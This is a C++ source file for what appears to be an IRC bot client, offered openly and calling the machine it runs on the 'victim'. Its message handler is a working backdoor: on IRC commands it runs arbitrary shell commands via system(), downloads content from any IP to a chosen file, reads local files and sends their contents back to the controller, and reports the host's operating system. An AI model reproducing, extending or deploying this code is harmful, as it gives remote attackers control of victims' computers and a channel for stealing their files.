/*
 * This program has been developed by Luca Tringali, using code from
 * Fredi Machado <https://github.com/Fredi> for the IRC client.
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "IRCHandler.h"

IRCCommandHandler ircCommandTable[NUM_IRC_CMDS] =
{
    { "PRIVMSG",            &IRCClient::HandlePrivMsg                   },
    { "NOTICE",             &IRCClient::HandleNotice                    },
    { "JOIN",               &IRCClient::HandleChannelJoinPart           },
    { "PART",               &IRCClient::HandleChannelJoinPart           },
    { "NICK",               &IRCClient::HandleUserNickChange            },
    { "QUIT",               &IRCClient::HandleUserQuit                  },
    { "353",                &IRCClient::HandleChannelNamesList          },
    { "433",                &IRCClient::HandleNicknameInUse             },
    { "001",                &IRCClient::HandleServerMessage             },
    { "002",                &IRCClient::HandleServerMessage             },
    { "003",                &IRCClient::HandleServerMessage             },
    { "004",                &IRCClient::HandleServerMessage             },
    { "005",                &IRCClient::HandleServerMessage             },
    { "250",                &IRCClient::HandleServerMessage             },
    { "251",                &IRCClient::HandleServerMessage             },
    { "252",                &IRCClient::HandleServerMessage             },
    { "253",                &IRCClient::HandleServerMessage             },
    { "254",                &IRCClient::HandleServerMessage             },
    { "255",                &IRCClient::HandleServerMessage             },
    { "265",                &IRCClient::HandleServerMessage             },
    { "266",                &IRCClient::HandleServerMessage             },
    { "366",                &IRCClient::HandleServerMessage             },
    { "372",                &IRCClient::HandleServerMessage             },
    { "375",                &IRCClient::HandleServerMessage             },
    { "376",                &IRCClient::HandleServerMessage             },
    { "439",                &IRCClient::HandleServerMessage             },
};


std::string httpRequest(std::string myipaddr, std::string myrequest) {

#ifdef _WIN32
    //  On Windows

    string request;
    string response;
    int resp_leng;

    char buffer[BUFFERSIZE];
    struct sockaddr_in serveraddr;
    int sock;

    WSADATA wsaData;
    //char *ipaddress = "66.171.248.178";

    int port = 80;

    //request+= "GET http://bot.whatismyipaddress.com/ http/1.1\r\nHOST: bot.whatismyipaddress.com\r\n";
    //request+="\r\n";
    request = myrequest;

    //init winsock
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
        std::cout << "WSAStartup() failed" << std::endl;

    //open socket
    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        std::cout << "socket() failed" << std::endl;

    //connect
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sin_family      = AF_INET;
    //serveraddr.sin_addr.s_addr = inet_addr(ipaddress);
    serveraddr.sin_addr.s_addr = inet_addr(myipaddr.c_str());
    serveraddr.sin_port        = htons((unsigned short) port);
    if (connect(sock, (struct sockaddr *) &serveraddr, sizeof(serveraddr)) < 0)
        cout << "connect() failed" << endl;

    //send request
    if (send(sock, request.c_str(), request.length(), 0) != request.length())
        cout << "send() sent a different number of bytes than expected" << endl;

    //get response
    response = "";
    resp_leng= BUFFERSIZE;
    while (resp_leng == BUFFERSIZE)
    {
        resp_leng= recv(sock, (char*)&buffer, BUFFERSIZE, 0);
        if (resp_leng>0)
            response+= string(buffer).substr(0,resp_leng);
        //note: download lag is not handled in this code
    }

    //display response
    //cout << response << endl;
    std::string answer (response);

    //disconnect
    //closesocket(sock);

    //cleanup
    WSACleanup();
    return answer;
#else

    int s, error;
    struct sockaddr_in addr;

    if((s = socket(AF_INET,SOCK_STREAM,0))<0)
    {
        std::cout<<"Error 01: creating socket failed!\n";
        //close(s);
        return "error";
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    //inet_aton("66.171.248.178",&addr.sin_addr);  //this should be the ip of the server I'm contacting
    inet_aton(myipaddr.c_str(),&addr.sin_addr);  //this should be the ip of the server I'm contacting

    error = connect(s,(sockaddr*)&addr,sizeof(addr));
    if(error!=0)
    {
        std::cout<<"Error 02: conecting to server failed!\n";
        //close(s);
        return "error";
    }

    //char msg[] = "GET http://bot.whatismyipaddress.com/ http/1.1\nHOST: bot.whatismyipaddress.com\n\n";

    char answ[1024];
    std::string answer;
    //send(s,msg,sizeof(msg),0);
    send(s,myrequest.c_str(),myrequest.length(),0);

    //while(recv(s,answ,1024,0)!=0)
    //cout<<answ<<endl;
    while(recv(s,answ,1024,0)!=0){
        answer.append(answ);
    }
    return answer;
#endif


};

void IRCClient::HandleCTCP(IRCMessage message)
{
    std::string to = message.parameters.at(0);
    std::string text = message.parameters.at(message.parameters.size() - 1);

    // Remove '\001' from start/end of the string
    text = text.substr(1, text.size() - 2);

    std::cout << "[" + message.prefix.nick << " requested CTCP " << text << "]" << std::endl;

    if (to == _nick)
    {
        if (text == "VERSION") // Respond to CTCP VERSION
        {
            SendIRC("NOTICE " + message.prefix.nick + " :\001VERSION Open source IRC client by Fredi Machado - https://github.com/Fredi/IRCClient \001");
            return;
        }

        // CTCP not implemented
        SendIRC("NOTICE " + message.prefix.nick + " :\001ERRMSG " + text + " :Not implemented\001");
    }
}

void IRCClient::HandlePrivMsg(IRCMessage message)
{
    std::string to = message.parameters.at(0);
    std::string text = message.parameters.at(message.parameters.size() - 1);

    // Handle Client-To-Client Protocol
    if (text[0] == '\001')
    {
        HandleCTCP(message);
        return;
    }

    if (to[0] == '#') {
        //public message
        std::cout << "From " + message.prefix.nick << " @ " + to + ": " << text << std::endl;
    }    else  {
        //private message
        std::cout << "From " + message.prefix.nick << ": " << text << std::endl;
    }

    if (text == "imtheboss") {
        //master = message.prefix.nick;  //this is if you want that only the master can send requests to the bots

        //commandHandler.ParseCommand("/msg " + master + "Hello master. I'm ready.", (IRCClient*)client);
        SendIRC("NOTICE " + message.prefix.nick + " :I'm ready.");
    }

    if (text == "os?") {
        //tell if the victim is using a Windows-like or Unix-like system
#ifdef _WIN32
        SendIRC("PRIVMSG " + message.prefix.nick + " :WINDOWS");
#else
        SendIRC("PRIVMSG " + message.prefix.nick + " :UNIX");
#endif

    }

    if (text.substr(0,4) == "exec") {
        //execute a command on system shell
        //example command: exec ls /home/ > /tmp/tmp.txt
        char tmprun[text.length()-7];
        for (int i=0; i< text.length()-5; i++) tmprun[i] = text[i+5];
        char empty[1] = "";
        tmprun[text.length()-5] = empty[0];
        //system(tmprun);
        if (system(tmprun)) SendIRC("PRIVMSG " + message.prefix.nick + " : Something went wrong.") ;
        else SendIRC("PRIVMSG " + message.prefix.nick + " : exec done.");
    }

    if (text.substr(0,7) == "IRCexec") {
        //force the execution of an IRC command
        //example command: IRCexec PRIVMSG dos_ : Hello.
        char tmprun[text.length()-10];
        for (int i=0; i< text.length()-8; i++) tmprun[i] = text[i+8];
        char empty[1] = "";
        tmprun[text.length()-8] = empty[0];

        std::string tmprunirc;
        tmprunirc.append(tmprun);
        SendIRC(tmprunirc);
    }

    if (text.substr(0,4) == "wget") {
        //writes the result of the http request in a file
        //example command: wget 66.171.248.178 GET http://bot.whatismyipaddress.com/ http/1.1\nHOST: bot.whatismyipaddress.com\n\n > /tmp/test.html
        char tmprun[text.length()-7];
        for (int i=0; i< text.length()-5; i++) tmprun[i] = text[i+5];
        char empty[1] = "";
        tmprun[text.length()-5] = empty[0];
        std::string tmpruns (tmprun);
        std::string code;

        std::string myip = tmpruns.substr(0,tmpruns.find_first_of(" "));
        std::string req = tmpruns.substr((tmpruns.find_first_of(" ")+1),((tmpruns.find_first_of(">")-tmpruns.find_first_of(" "))-1));
        std::string file = tmpruns.substr((tmpruns.find_first_of(">")+2),((tmpruns.length()-tmpruns.find_first_of(">"))-2));

        std::cout << "|" << req.c_str() << "|" << std::endl;

        std::string newln = "\\";
        newln += "n";
        int y = 0;
        std::string temps = "";
        do {
            int t = req.find(newln,y);
            temps += req.substr(y,(t-y));
            temps += "\n";
            y = t+2;
        } while (y < (req.find_last_of(" ")-2));
        temps += "\n";
        temps += "\n";

        std::cout << "|" << temps.c_str() << "|" << std::endl;
        code = httpRequest(myip , temps);
        std::cout << "|" << code.c_str() << "|" << std::endl;
        SendIRC("PRIVMSG " + message.prefix.nick + " : Download done.");

        std::ofstream out(file.c_str());
        out << code.c_str();
        out.close();
    }

    if (text.substr(0,4) == "read") {
        //read a file's content and print it as a private message
        //example command: read /home/luca/test.txt
        char tmprun[text.length()-7];
        for (int i=0; i< text.length()-5; i++) tmprun[i] = text[i+5];
        char empty[1] = "";
        tmprun[text.length()-5] = empty[0];

        std::string text;
        text = "";
        std::ifstream texto(tmprun);
        if (texto) {
            char tmpchr;
            do {
                texto >> tmpchr;
                text += tmpchr;
                /*if (tmpchr=='\n') {
                           SendIRC("PRIVMSG " + message.prefix.nick + " : " + text);
                           text = "";
                       }*/
            } while (!texto.eof());
            SendIRC("PRIVMSG " + message.prefix.nick + " : " + text);
        }
        texto.close();


    }

}

void IRCClient::HandleNotice(IRCMessage message)
{
    std::string from = message.prefix.nick != "" ? message.prefix.nick : message.prefix.prefix;
    std::string text = message.parameters.at(message.parameters.size() - 1);

    if (text[0] == '\001')
    {
        text = text.substr(1, text.size() - 2);
        if (text.find(" ") == std::string::npos)
        {
            std::cout << "[Invalid " << text << " reply from " << from << "]" << std::endl;
            return;
        }
        std::string ctcp = text.substr(0, text.find(" "));
        std::cout << "[" << from << " " << ctcp << " reply]: " << text.substr(text.find(" ") + 1) << std::endl;
    }
    else
        std::cout << "-" << from << "- " << text << std::endl;
}

void IRCClient::HandleChannelJoinPart(IRCMessage message)
{
    std::string channel = message.parameters.at(0);
    std::string action = message.command == "JOIN" ? "joins" : "leaves";
    std::cout << message.prefix.nick << " " << action << " " << channel << std::endl;
}

void IRCClient::HandleUserNickChange(IRCMessage message)
{
    std::string newNick = message.parameters.at(0);
    std::cout << message.prefix.nick << " changed his nick to " << newNick << std::endl;
}

void IRCClient::HandleUserQuit(IRCMessage message)
{
    std::string text = message.parameters.at(0);
    std::cout << message.prefix.nick << " quits (" << text << ")" << std::endl;
}

void IRCClient::HandleChannelNamesList(IRCMessage message)
{
    std::string channel = message.parameters.at(2);
    std::string nicks = message.parameters.at(3);
    std::cout << "People on " << channel << ":" << std::endl << nicks << std::endl;
}

void IRCClient::HandleNicknameInUse(IRCMessage message)
{
    std::cout << message.parameters.at(1) << " " << message.parameters.at(2) << std::endl;
}

void IRCClient::HandleServerMessage(IRCMessage message)
{
    std::vector<std::string>::const_iterator itr = message.parameters.begin();
    ++itr; // skip the first parameter (our nick)
    for (; itr != message.parameters.end(); ++itr)
        std::cout << *itr << " ";
    std::cout << std::endl;
}
